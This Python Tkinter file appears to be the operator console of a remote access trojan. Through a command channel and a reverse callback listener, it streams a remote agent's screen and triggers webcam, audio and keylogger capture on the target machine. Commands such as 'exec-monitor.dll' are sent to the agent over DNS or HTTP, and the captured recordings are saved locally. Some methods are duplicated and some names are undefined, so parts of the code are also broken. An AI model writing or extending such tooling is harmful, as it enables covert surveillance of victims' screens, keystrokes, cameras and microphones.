import tkinter as tk
from tkinter import ttk
import io
import time
import threading
import os
import cv2
import numpy as np
from PIL import Image, ImageTk
from datetime import datetime
from tools.tcp_client import TCPVideoClient, AudioClient
import queue

def get_icon_path():
    base_dir = os.environ.get('TAO_BASE_DIR')
    if not base_dir:
        current_file_dir = os.path.dirname(os.path.abspath(__file__))
        base_dir = os.path.abspath(os.path.join(current_file_dir, ".."))
    
    return os.path.join(base_dir, "ico", "ico.ico")

class LiveFeedWindow:
    def __init__(self, parent, controller, agent_ip, video_client=None):
        self.controller = controller
        self.agent_ip = agent_ip
        self.window = tk.Toplevel(parent)
        self.window.title("Screen Monitor Feed")
        self.window.geometry("800x600")
        self.window.resizable(False, False)
        
        icon_path = get_icon_path()
        if os.path.exists(icon_path):
            try:
                self.window.wm_iconbitmap(icon_path)
            except Exception:
                pass       
        
        self.window.configure(bg="#0D0D0D")
        self.window.protocol("WM_DELETE_WINDOW", self.on_close)

        self.video_client = video_client
        self.is_shared_client = (video_client is not None)
        self.recording = False
        self.video_writer = None
        self.record_path = None
        self.last_raw_frame = None
        self.frames_displayed = 0
        self.fps_history = []
        self.last_frame_time = time.time()
        self.start_time = time.time()
        self.frame_queue = queue.Queue(maxsize=3)
        self.camera_queue = queue.Queue(maxsize=3)
        self.display_loop_started = False
        self.remote_screen_width  = None
        self.remote_screen_height = None

        self._build_ui()

        if self.video_client and self.video_client.session_active:
            self.controller._log_m("STREAM: Using shared connection")
            self.video_client.set_video_callback(self.on_frame_received)
            self.status_label.config(text="READY (Shared)", fg="#4CAF50")
            self.stream_btn.config(state="normal")
        else:
            self.status_label.config(text="SYS: Connecting...", fg="#FFA500")
            self.stream_btn.config(state="disabled")
            self._safe_after(500, self.connect_to_agent)

    def _window_alive(self) -> bool:

        try:
            return bool(self.window.winfo_exists())
        except Exception:
            return False

    def _safe_after(self, delay, func, *args):

        if not self._window_alive():
            return
        def _guarded():
            if self._window_alive():
                func(*args)
        self.window.after(delay, _guarded)

    def _build_ui(self):

        header = tk.Frame(self.window, bg="#2C1E1E", height=40)
        header.pack(fill="x", padx=10, pady=(10, 5))
        header.pack_propagate(False)

        self.status_label = tk.Label(header, text="SYS: Initializing...", 
                                     bg="#2C1E1E", fg="#FFA500",
                                     font=("Consolas", 11, "bold"))
        self.status_label.pack(side="left", padx=10)

        self.fps_label = tk.Label(header, text="FPS: 0.0 | Frames: 0",
                                  bg="#2C1E1E", fg="#F2E9E4",
                                  font=("Consolas", 10))
        self.fps_label.pack(side="right", padx=10)

        btn_frame = tk.Frame(self.window, bg="#0D0D0D")
        btn_frame.pack(fill="x", padx=10, pady=5)

        self.stream_btn = tk.Button(btn_frame, text="▶ Start Stream", 
                                    command=self.toggle_stream,
                                    bg="#4CAF50", fg="white", 
                                    font=("Arial", 10, "bold"),
                                    padx=15, pady=5, state="disabled")
        self.stream_btn.pack(side="left", padx=5)

        self.snap_btn = tk.Button(btn_frame, text="📸 Screenshot", 
                                  command=self.take_screenshot,
                                  bg="#2E5077", fg="white", 
                                  font=("Arial", 10, "bold"),
                                  padx=15, pady=5)
        self.snap_btn.pack(side="left", padx=5)

        self.record_btn = tk.Button(btn_frame, text="🔴 Record", 
                                    command=self.toggle_recording,
                                    bg="#FF4444", fg="white", 
                                    font=("Arial", 10, "bold"),
                                    padx=15, pady=5)
        self.record_btn.pack(side="left", padx=5)

        tk.Button(btn_frame, text="✕ Close", command=self.on_close,
                  bg="#555555", fg="white", font=("Arial", 10, "bold"),
                  padx=15, pady=5).pack(side="right", padx=5)

        video_frame = tk.Frame(self.window, bg="#0D0D0D")
        video_frame.pack(fill="both", expand=True, padx=10, pady=5)

        self.canvas = tk.Canvas(video_frame, bg="#1A1212", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)
        self.canvas.bind("<Configure>", self._on_canvas_resize)

        self.canvas.create_text(400, 300, text="[ NO VIDEO SIGNAL ]", 
                               fill="#333333", font=("Arial", 16), 
                               tags="placeholder")

    def toggle_audio(self):

        if not self.audio_client.recording:
            if self.audio_client.start_recording():
                self.audio_btn.config(text="🛑 Stop Audio", bg=self.controller.colors["red"])
                self.controller._log_system("Audio capture started")
        else:
            if self.audio_client.stop_recording():
                self.audio_btn.config(text="🎤 Start Audio", bg=self.controller.colors["blue"])
                self.controller._log_system("Audio capture stopped")

    def take_screenshot(self):

        if not hasattr(self, 'last_raw_frame') or not self.last_raw_frame:
            self.controller._log_m("ERROR: No frame data available for screenshot")
            return

        try:

            img = Image.open(io.BytesIO(self.last_raw_frame))

            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')

            script_dir = os.path.dirname(os.path.abspath(__file__))
            save_dir = os.path.join(script_dir, "output", "screenshots")

            os.makedirs(save_dir, exist_ok=True)

            filename = f"snap_{timestamp}.png"
            filepath = os.path.join(save_dir, filename)

            img.save(filepath)

            self.controller._log_m(f"STREAM: Screenshot saved: {filepath}")
            from tkinter import messagebox as _mb
            _mb.showinfo("Success", f"Screenshot saved to:\n{filepath}")

        except Exception as e:
            self.controller._log_m(f"ERROR: Screenshot error: {e}")
            from tkinter import messagebox as _mb
            _mb.showerror("Error", f"Failed to save screenshot:\n{e}")

    def _load_dll_for_camera(self):

        if self.controller.active_mode == "dns":
            self.controller._log_m("STREAM: Sending command to agent...")

            if self.controller.dns_mode.dns_cmd("exec-monitor.dll"):
                self.controller._log_m("STREAM: Command sent.")

                self._safe_after(3000, self._start_camera_after_dll)
                return True
            else:
                self.controller._log_m("STREAM: Command failed to send.")
                return False

        return True

    def _start_camera_after_dll(self):

        if not self.camera_client:
            self.controller._log_m("SESSION: Camera client not initialized")
            return

        if self.camera_client.start_camera():
            self.camera_btn.config(text="🛑 Stop Camera", bg="#FFA726")
            self.controller._log_m("CAMERA: Camera capture STARTED")

            self.camera_window = tk.Toplevel(self.window)
            self.camera_window.title("📷 Camera Feed")
            self.camera_window.geometry("640x520")
            self.camera_window.configure(bg="#0D0D0D")
            self.camera_window.protocol("WM_DELETE_WINDOW", self.close_camera_window)

            cam_tools = tk.Frame(self.camera_window, bg="#1A1A1A")
            cam_tools.pack(side="bottom", fill="x", pady=5)

            self.cam_shot_btn = tk.Button(cam_tools, text="📸 Screenshot", 
                                         command=self.save_camera_screenshot,
                                         bg="#6A1B9A", fg="white", font=("Arial", 9, "bold"))
            self.cam_shot_btn.pack(side="left", padx=10, pady=5)

            self.cam_record_btn = tk.Button(cam_tools, text="🔴 Record", 
                                           command=self.toggle_camera_recording,
                                           bg="#333333", fg="white", font=("Arial", 9, "bold"))
            self.cam_record_btn.pack(side="left", padx=10, pady=5)

            self.camera_canvas = tk.Label(self.camera_window, bg="#0D0D0D")
            self.camera_canvas.pack(fill="both", expand=True)

            x = self.window.winfo_x() + self.window.winfo_width() + 10
            y = self.window.winfo_y()
            self.camera_window.geometry(f"+{x}+{y}")
        else:
            self.controller._log_m("ERROR: Failed to start camera")

    def toggle_recording(self):

        if not self.recording:

            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')

            script_dir = os.path.dirname(os.path.abspath(__file__))
            video_dir = os.path.join(script_dir, "output", "videos")
            os.makedirs(video_dir, exist_ok=True)

            self.record_path = os.path.join(video_dir, f"rec_{timestamp}.avi")

            self.controller._log_m(f"STREAM: Recording to: {self.record_path}")

            self.recording = True
            self.video_writer = None  

            self.frames_recorded = 0  

            self.record_btn.config(text="⏹ Stop Rec", bg="gray")  

            self.controller._log_m(f"STREAM: Recording started")

        else:

            self.recording = False

            if self.video_writer is not None:
                try:
                    self.video_writer.release()
                    self.controller._log_m(f"STREAM: Video saved: {self.record_path} ({self.frames_recorded} frames)")
                except Exception as e:
                    self.controller._log_m(f"STREAM: Error finalizing video: {e}")
                self.video_writer = None
            else:
                self.controller._log_m(f"STREAM: No frames were recorded (writer was never initialized)")

            self.record_btn.config(text="🔴 Record", bg="#FF4444")  

    def save_camera_screenshot(self):
        if self.last_camera_pil:

            script_dir = os.path.dirname(os.path.abspath(__file__))
            save_dir = os.path.join(script_dir, "output", "screenshots")
            os.makedirs(save_dir, exist_ok=True)

            path = os.path.join(save_dir, f"camera_{int(time.time())}.png")
            self.last_camera_pil.save(path)
            self.controller._log_m(f"CAMERA: Camera screenshot saved: {path}")

    def toggle_camera_recording(self):
        import cv2
        if not hasattr(self, 'is_recording_camera'): 
            self.is_recording_camera = False

        if not self.is_recording_camera:
            self.is_recording_camera = True
            self.cam_record_btn.config(text="⏹ Stop Record", bg="#FF4444")

            script_dir = os.path.dirname(os.path.abspath(__file__))
            video_dir = os.path.join(script_dir, "output", "videos")
            os.makedirs(video_dir, exist_ok=True)

            self.cam_record_path = os.path.join(video_dir, f"camera_{int(time.time())}.avi")

            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            self.camera_video_writer = cv2.VideoWriter(self.cam_record_path, fourcc, 20.0, (640, 480))

            self.controller._log_m(f"CAMERA: Recording started: {self.cam_record_path}")
        else:
            self.is_recording_camera = False
            self.cam_record_btn.config(text="🔴 Record", bg="#333333")
            if self.camera_video_writer:
                self.camera_video_writer.release()
                self.camera_video_writer = None
            self.controller._log_m(f"CAMERA: Recording saved: {self.cam_record_path}")

    def _on_canvas_resize(self, event):
        self.canvas.coords("placeholder", event.width // 2, event.height // 2)

    def connect_to_agent(self):


        if self.is_shared_client and self.video_client and self.video_client.session_active:
            self.controller._log_m("STREAM: Using shared connection")
            self.video_client.set_video_callback(self.on_frame_received)
            self._safe_after(0, lambda: self.status_label.config(text="⚡ READY (Shared)", fg="#4CAF50"))
            self._safe_after(0, lambda: self.stream_btn.config(state="normal"))
            return

        if self.controller.active_mode == "dns":

            self.controller._log_m(f"STREAM: Connecting to {self.agent_ip}:443...")
            if not self.video_client:
                self.video_client = TCPVideoClient(self.agent_ip, port=443)
            self.video_client.set_video_callback(self.on_frame_received)
            threading.Thread(target=self._do_connect, daemon=True).start()
        else:

            self.controller._log_m("STREAM: HTTP mode — starting reverse listener...")
            threading.Thread(target=self._connect_reverse, daemon=True).start()

    def _connect_reverse(self):

        from tools.reverse_listener import ReverseTCPListener

        port = 9001   

        listener = ReverseTCPListener(
            port=port,
            timeout=30,
            log_fn=self.controller._log_m
        )
        if not listener.start():
            self._safe_after(0, lambda: self.status_label.config(
                text="ERROR: Listener failed", fg="#FF4444"))
            return

        controller_ip = ReverseTCPListener.get_local_ip()
        callback_cmd  = f"exec-monitor.dll|CALLBACK:{controller_ip}:{port}"
        self.controller._log_m(f"STREAM: Sending callback command → {callback_cmd}")
        self.controller._send_http_cmd(callback_cmd)

        self._safe_after(0, lambda: self.status_label.config(
            text=f"SYS: Waiting for agent callback ({port})...", fg="#FFA500"))

        sock = listener.wait_for_connection()
        if not sock:
            self._safe_after(0, lambda: self.status_label.config(
                text="ERROR: Agent did not call back", fg="#FF4444"))
            self.controller._log_m("STREAM: Reverse connection timed out")
            return

        self.video_client = TCPVideoClient.from_socket(sock, agent_ip=self.agent_ip)
        self.video_client.set_video_callback(self.on_frame_received)

        self._safe_after(0, lambda: self.status_label.config(text="⚡ READY", fg="#4CAF50"))
        self._safe_after(0, lambda: self.stream_btn.config(state="normal"))
        self.controller._log_m("STREAM: Reverse connection established SYS:")

    def _do_connect(self):

        max_retries = 3
        retry_delay = 2

        for attempt in range(1, max_retries + 1):
            self.controller._log_m(f"Connection attempt {attempt}/{max_retries}...")

            if self.video_client.connect():
                self._safe_after(0, lambda: self.status_label.config(
                    text="READY", fg="#4CAF50"))
                self._safe_after(0, lambda: self.stream_btn.config(state="normal"))
                self.controller._log_m("SYS: Connected to video server")
                return  

            if attempt < max_retries:
                self.controller._log_m(f"Connection failed, retrying...")
                time.sleep(retry_delay)

        self._safe_after(0, lambda: self.status_label.config(
            text="ERROR: CONNECTION FAILED", fg="#FF4444"))
        self.controller._log_m("ERROR: Failed to connect after 3 attempts")

        self._safe_after(0, lambda: messagebox.showerror(
            "Connection Failed",
            f"Could not connect to agent at {self.agent_ip}:443\n\n"
            "Possible causes:\n"
            "• Agent DLL not fully loaded\n"
            "• Firewall blocking connections\n"
            "• Agent IP mismatch\n\n"
            "Try:\n"
            "1. Close this window and wait 5 seconds\n"
            "2. Try opening Live Feed again\n"
            "3. Check agent IP in DNS server logs"
        ))

        self._safe_after(0, lambda: self.stream_btn.config(
            text="▶ Start Stream", state="normal"))

    def on_frame_received(self, session_id, frame_index, frame_data):
        try:

            self.frames_displayed += 1

            now = time.time()
            duration = now - self.last_frame_time
            self.last_frame_time = now

            if duration > 0:
                current_fps = 1.0 / duration

                self.fps_history.append(current_fps)
                if len(self.fps_history) > 10:
                    self.fps_history.pop(0)
                avg_fps = sum(self.fps_history) / len(self.fps_history)
            else:
                avg_fps = 0.0

            self._safe_after(0, lambda: self.fps_label.config(
                text=f"FPS: {avg_fps:.1f} | Frames: {self.frames_displayed} | "
                     f"Time: {int(time.time() - self.start_time)}s"
            ))

            self.frame_queue.put_nowait((frame_index, frame_data))

        except queue.Full:
            pass
        except Exception as e:
            print(f"Error in frame reception: {e}")

    def _display_loop(self):

        try:
            frame_index, frame_data = None, None
            while not self.frame_queue.empty():
                try:
                    frame_index, frame_data = self.frame_queue.get_nowait()
                except queue.Empty:
                    break

            if frame_data:
                self._display_frame(frame_data)
        except Exception as e:
            print(f"STREAM: Video Error: {e}")

        try:
            cam_data = None
            while not self.camera_queue.empty():
                try:
                    cam_data = self.camera_queue.get_nowait()
                except queue.Empty:
                    break

            if cam_data:
                self._update_camera_ui(cam_data) 

        except Exception as e:
            print(f"STREAM: Camera Error: {e}")

        if self.video_client and self.video_client.running:
            self._safe_after(10, self._display_loop)

    def _display_frame(self, frame_data):
        try:

            self.last_raw_frame = frame_data  

            img = Image.open(io.BytesIO(frame_data))

            if self.recording:
                frame_cv = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)

                if self.video_writer is None:
                    h, w = frame_cv.shape[:2]
                    fourcc = cv2.VideoWriter_fourcc(*'XVID')
                    fps = 20.0

                    self.video_writer = cv2.VideoWriter(self.record_path, fourcc, fps, (w, h))

                    if not self.video_writer.isOpened():
                        self.controller._log_m(f"ERROR: Could not open video writer for {self.record_path}")
                        self.recording = False
                        self.record_btn.config(text="🔴 Record", bg="#FF4444")
                        self.video_writer = None
                        return
                    else:
                        self.controller._log_m(f"STREAM: Recording initialized: {w}x{h} @ {fps} FPS")
                        self.frames_recorded = 0

                if self.video_writer is not None and self.video_writer.isOpened():
                    self.video_writer.write(frame_cv)
                    self.frames_recorded += 1

                    if self.frames_recorded % 30 == 0:
                        self.controller._log_m(f"STREAM: Recording... {self.frames_recorded} frames")

            canvas_width = self.canvas.winfo_width()
            canvas_height = self.canvas.winfo_height()

            if canvas_width < 10 or canvas_height < 10: 
                return

            resample_filter = getattr(Image, 'Resampling', Image).LANCZOS
            img.thumbnail((canvas_width, canvas_height), resample_filter)

            photo = ImageTk.PhotoImage(img)
            self.canvas.delete("all")
            self.canvas.create_image(canvas_width // 2, canvas_height // 2, image=photo, anchor="center")
            self.canvas.image = photo

            if not self.remote_screen_width:
                self.remote_screen_width = img.width
                self.remote_screen_height = img.height
                self.controller._log_m(f"STREAM: Remote screen: {img.width}x{img.height}")

        except Exception as e:
            self.controller._log_m(f"ERROR: Frame processing error: {e}")
            import traceback
            self.controller._log_m(traceback.format_exc())

    def take_screenshot(self):

        if not hasattr(self, 'last_raw_frame') or not self.last_raw_frame:
            self.controller._log_m("ERROR: No frame data available for screenshot")
            return

        try:
            img = Image.open(io.BytesIO(self.last_raw_frame))
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')

            script_dir = os.path.dirname(os.path.abspath(__file__))
            save_dir = os.path.join(script_dir, "output", "screenshots")
            os.makedirs(save_dir, exist_ok=True)

            path = os.path.join(save_dir, f"snap_{timestamp}.png")
            img.save(path)
            self.controller._log_system(f"STREAM: Screenshot saved: {path}")
        except Exception as e:
            self.controller._log_system(f"STREAM: Screenshot error: {e}")

    def open_keylogger(self):

        if self.keylogger_window and self.keylogger_window.window.winfo_exists():
            self.keylogger_window.window.focus_set()
            self.keylogger_window.window.lift()
            self.controller._log_m("STREAM: Keylogger window already open")
        else:

            self.keylogger_window = KeyloggerWindow(
                self.window, 
                self.controller, 
                self.agent_ip,
                video_client=self.video_client, 
                state_callback=None
            )
            self.controller._log_m("STREAM: Keylogger window opened")

            x = self.window.winfo_x() + self.window.winfo_width() + 10
            y = self.window.winfo_y()
            self.keylogger_window.window.geometry(f"+{x}+{y}")

    def toggle_audio(self):

        if not self.audio_client:
            self.controller._log_m("STREAM: Audio client not initialized")
            return

        if not self.audio_client.recording:

            if self.audio_client.start_recording():
                self.audio_btn.config(text="🛑 Stop Audio", bg="#FF9800")
                self.controller._log_m("🎤 Audio recording STARTED")
            else:
                self.controller._log_m("STREAM: Failed to start audio recording")
        else:

            if self.audio_client.stop_recording():
                self.audio_btn.config(text="🎤 Audio", bg="#FF5722")
                self.controller._log_m("STREAM: Audio recording STOPPED")

    def on_audio_event(self, event_type, data):

        if event_type == "started":
            self.controller._log_m(f"STREAM: Recording to: {data}")
        elif event_type == "stopped":
            self.controller._log_m(f"STREAM: Audio saved: {data}")

    def toggle_camera(self):

        if not self.camera_client:
            self.controller._log_m("STREAM: Camera client not initialized")
            return

        if not self.camera_client.active:

            if self.controller.monitor2_loaded:
                self.controller._log_m("SYS: Session already loaded, starting camera...")
                self._start_camera_after_dll()
                return

            if self.controller.active_mode == "dns":
                self.controller._log_m("STREAM: Starting camera...")

                if self.controller.dns_mode.dns_cmd("exec-monitor.dll"):
                    self.controller._log_m("STREAM: 'Start' command sent")
                    self.controller.monitor2_loaded = True
                    self._safe_after(3000, self._start_camera_after_dll)
                else:
                    self.controller._log_m("STREAM: Failed to send command")
                return

            self._start_camera_after_dll()
        else:
            self.close_camera_window()

    def _start_camera_after_dll(self):

        if not self.camera_client:
            self.controller._log_m("STREAM: Camera client not initialized")
            return

        if self.camera_client.start_camera():
            self.camera_btn.config(text="🛑 Stop Camera", bg="#FFA726")
            self.controller._log_m("📷 Camera capture STARTED")
            self.camera_active = True

            self.camera_window = tk.Toplevel(self.window)
            self.camera_window.title("📷 Camera Feed")
            self.camera_window.geometry("640x520")
            self.camera_window.configure(bg="#0D0D0D")
            self.camera_window.protocol("WM_DELETE_WINDOW", self.close_camera_window)

            cam_tools = tk.Frame(self.camera_window, bg="#1A1A1A")
            cam_tools.pack(side="bottom", fill="x", pady=5)

            self.cam_shot_btn = tk.Button(cam_tools, text="📸 Screenshot", 
                                         command=self.save_camera_screenshot,
                                         bg="#6A1B9A", fg="white", font=("Arial", 9, "bold"))
            self.cam_shot_btn.pack(side="left", padx=10, pady=5)

            self.cam_record_btn = tk.Button(cam_tools, text="🔴 Record", 
                                           command=self.toggle_camera_recording,
                                           bg="#333333", fg="white", font=("Arial", 9, "bold"))
            self.cam_record_btn.pack(side="left", padx=10, pady=5)

            self.camera_canvas = tk.Label(self.camera_window, bg="#0D0D0D")
            self.camera_canvas.pack(fill="both", expand=True)

            x = self.window.winfo_x() + self.window.winfo_width() + 10
            y = self.window.winfo_y()
            self.camera_window.geometry(f"+{x}+{y}")

            self.controller.active_tool_windows['camera'] = self
        else:
            self.controller._log_m("STREAM: Failed to start camera")

    def close_camera_window(self):

        if self.camera_client and self.camera_client.active:
            self.camera_client.stop_camera()
            self.camera_btn.config(text="📷 Camera", bg="#00BCD4")
            self.controller._log_m("STREAM: Camera capture STOPPED")
            self.camera_active = False

        if self.controller.active_tool_windows['camera'] == self:
            self.controller.active_tool_windows['camera'] = None

        if self.camera_window:
            try:
                self.camera_window.destroy()
            except:
                pass
            self.camera_window = None

    def on_camera_event(self, event_type, data):

            if event_type == "frame":
                try:

                    if hasattr(self, 'camera_queue'):
                        self.camera_queue.put_nowait(data)
                except queue.Full:
                    pass 

            elif event_type == "started":
                self.controller._log_m(f"STREAM: Recording to: {data}")
            elif event_type == "stopped":
                self.controller._log_m(f"STREAM: Audio saved: {data}")

    def _update_camera_ui(self, data):

        if self.camera_window and self.camera_canvas:
            try:
                img = Image.open(io.BytesIO(data))
                self.last_camera_pil = img  

                if getattr(self, 'is_recording_camera', False) and getattr(self, 'camera_video_writer', None):
                    import cv2
                    import numpy as np

                    cv_img = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
                    cv_img = cv2.resize(cv_img, (640, 480))
                    self.camera_video_writer.write(cv_img)

                canvas_width = self.camera_canvas.winfo_width()
                canvas_height = self.camera_canvas.winfo_height()

                if canvas_width > 10 and canvas_height > 10:
                    resample_filter = getattr(Image, 'Resampling', Image).LANCZOS
                    display_img = img.copy()
                    display_img.thumbnail((canvas_width, canvas_height), resample_filter)
                    photo = ImageTk.PhotoImage(display_img)

                    self.camera_canvas.config(image=photo)
                    self.camera_canvas.image = photo 
            except Exception as e:
                print(f"CAMERA: UI Update error: {e}")

    def toggle_stream(self):

        if not self.video_client:
            return

        if self.video_client.streaming:

            if self.video_client.stop_stream():
                self.stream_btn.config(text="▶ Start Stream", bg="#4CAF50")
                self.status_label.config(text="⏸ PAUSED", fg="#FFA500")
                self.controller._log_m("⏸ Stream paused")

        else:

            if self.video_client.start_stream():
                self.stream_btn.config(text="⏹ Stop Stream", bg="#A63429")
                self.status_label.config(text="▶ STREAMING", fg="#4CAF50")
                self.controller._log_m("STREAM: Started")

                if not self.display_loop_started:
                    self._safe_after(10, self._display_loop)
                    self.display_loop_started = True
                    self.controller._log_m("STREAM: Video started")

    def stop_stream(self):
        self.controller._log_m("STREAM: Stopping video stream...")

        if self.video_client and self.video_client.streaming:
            self.video_client.stop_stream()

    def on_close(self):

        self.controller._log_m("Closing Live Feed window...")

        if hasattr(self, 'recording') and self.recording:
            self.toggle_recording()

        if hasattr(self, 'video_client') and self.video_client:
            if self.video_client.streaming:
                self.video_client.stop_stream()

        if not self.is_shared_client and self.video_client:
            self.controller._log_m("Closing owned TCP connection...")
            try:
                self.video_client.close_session()
                time.sleep(0.3)
                self.video_client.disconnect()
            except Exception as e:
                print(f"Disconnect error: {e}")
        else:
            if self.video_client:
                self.video_client.video_callback = None
            self.controller._log_m("Detaching from shared connection")

        if self.controller.active_tool_windows.get('live_feed') == self:
            self.controller.active_tool_windows['live_feed'] = None

        monitor_tools = ['live_feed', 'keylogger', 'camera']
        still_open = [t for t in monitor_tools
                      if self.controller.active_tool_windows.get(t) is not None]
        if not still_open:
            self.controller.monitor2_loaded  = False
            self.controller.monitor2_loading = False
            if self.controller.active_mode != "dns":
                self.controller._send_taskkill("monitor.dll")
            self.controller._log_m("SESSION: All monitor tools closed — monitor.dll terminated")

        self.window.destroy()
        self.controller._log_m("Live Feed closed")

class EmbeddedLiveFeed(tk.Frame):

    def __init__(self, parent, controller, agent_ip):
        super().__init__(parent, bg="black")
        self.controller = controller
        self.agent_ip = agent_ip

        self.video_client = None
        self.last_frame_data = None
        self.frames_displayed = 0
        self.fps_history = []
        self.last_frame_time = time.time()

        self.recording = False
        self.video_writer = None
        self.record_path = None

        self._setup_ui()

    def _setup_ui(self):

        toolbar = tk.Frame(self, bg="#333", height=40)
        toolbar.pack(side="top", fill="x")
        toolbar.pack_propagate(False)

        self.btn_start = tk.Button(toolbar, text="▶ Start Stream", 
                                   command=self.toggle_stream,
                                   bg="#4CAF50", fg="white", font=("Arial", 9, "bold"))
        self.btn_start.pack(side="left", padx=5, pady=5)

        tk.Button(toolbar, text="📸 Screenshot", command=self.take_screenshot,
                  bg="#2196F3", fg="white", font=("Arial", 9, "bold")).pack(side="left", padx=5, pady=5)

        self.btn_rec = tk.Button(toolbar, text="🔴 Record", 
                                 command=self.toggle_record,
                                 bg="#FF4444", fg="white", font=("Arial", 9, "bold"))
        self.btn_rec.pack(side="left", padx=5, pady=5)

        self.fps_label = tk.Label(toolbar, text="FPS: 0.0", bg="#333", 
                                  fg="white", font=("Consolas", 9))
        self.fps_label.pack(side="right", padx=10)

        self.canvas = tk.Canvas(self, bg="black", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)
        self.canvas.bind("<Configure>", self._on_resize)

    def toggle_stream(self):

        if not self.video_client or not self.video_client.session_active:

            self.video_client = TCPVideoClient(self.agent_ip, 443)
            self.video_client.set_video_callback(self.update_frame)

            self.btn_start.config(text="SYS: Connecting...", state="disabled")
            Thread(target=self._connect_and_start, daemon=True).start()
        else:

            self.video_client.stop_stream()
            self.btn_start.config(text="▶ Start Stream", bg="#4CAF50")

    def _connect_and_start(self):

        if self.video_client.connect():
            time.sleep(0.5)
            if self.video_client.start_stream():
                self.after(0, lambda: self.btn_start.config(
                    text="⏹ Stop Stream", bg="#A63429", state="normal"))
                self.controller._log_system("SYS: Live stream started")
            else:
                self.after(0, lambda: self.btn_start.config(
                    text="▶ Start Stream", state="normal"))
        else:
            self.after(0, lambda: self.btn_start.config(
                text="▶ Start Stream", state="normal"))
            self.controller._log_system("ERROR: Connection failed")

    def toggle_record(self):

        if not self.recording:

            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            os.makedirs("output/videos", exist_ok=True)
            self.record_path = f"output/videos/rec_{timestamp}.avi"

            self.recording = True
            self.btn_rec.config(text="⏹ Stop Rec", bg="gray")
            self.controller._log_system(f"🔴 Recording to {self.record_path}")
        else:

            self.recording = False
            if self.video_writer:
                self.video_writer.release()
                self.video_writer = None
            self.btn_rec.config(text="🔴 Record", bg="#FF4444")
            self.controller._log_system(f"💾 Video saved: {self.record_path}")

    def update_frame(self, session_id, frame_idx, frame_data):

        self.last_frame_data = frame_data

        try:

            img_pil = Image.open(io.BytesIO(frame_data))

            if self.recording:
                self._record_frame(img_pil)

            self._display_frame(img_pil)

            self._update_fps()

        except Exception as e:
            print(f"Frame update error: {e}")

    def _record_frame(self, pil_image):

        try:

            frame_cv = cv2.cvtColor(np.array(pil_image), cv2.COLOR_RGB2BGR)

            if self.video_writer is None:
                h, w = frame_cv.shape[:2]
                fourcc = cv2.VideoWriter_fourcc(*'XVID')
                fps = 20.0  

                self.video_writer = cv2.VideoWriter(self.record_path, fourcc, fps, (w, h))

            self.video_writer.write(frame_cv)

        except Exception as e:
            print(f"Recording error: {e}")
            self.recording = False
            self.btn_rec.config(text="🔴 Record", bg="#FF4444")

    def _display_frame(self, pil_image):

        canvas_width = self.canvas.winfo_width()
        canvas_height = self.canvas.winfo_height()

        if canvas_width < 10 or canvas_height < 10:
            return

        resample_filter = getattr(Image, 'Resampling', Image).LANCZOS
        img_copy = pil_image.copy()
        img_copy.thumbnail((canvas_width, canvas_height), resample_filter)

        self.tk_img = ImageTk.PhotoImage(img_copy)

        self.canvas.delete("all")
        self.canvas.create_image(
            canvas_width // 2, canvas_height // 2, 
            image=self.tk_img, anchor="center"
        )

    def _update_fps(self):

        current_time = time.time()

        if self.last_frame_time:
            fps = 1.0 / (current_time - self.last_frame_time)
            self.fps_history.append(fps)

            if len(self.fps_history) > 30:
                self.fps_history.pop(0)

            avg_fps = sum(self.fps_history) / len(self.fps_history)
            self.fps_label.config(text=f"FPS: {avg_fps:.1f}")

        self.last_frame_time = current_time
        self.frames_displayed += 1

    def take_screenshot(self):

        if not self.last_frame_data:
            self.controller._log_system("SYS: No frame to capture")
            return

        try:
            img = Image.open(io.BytesIO(self.last_frame_data))
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            os.makedirs("output/camera", exist_ok=True)
            path = f"output/camera/snap_{timestamp}.png"
            img.save(path)
            self.controller._log_system(f"📸 Screenshot saved: {path}")
        except Exception as e:
            self.controller._log_system(f"ERROR: Screenshot error: {e}")

    def _on_resize(self, event):


        if hasattr(self, 'tk_img') and self.tk_img:
            pass  

    def cleanup(self):

        if self.recording:
            self.toggle_record()

        if self.video_client:
            self.video_client.disconnect()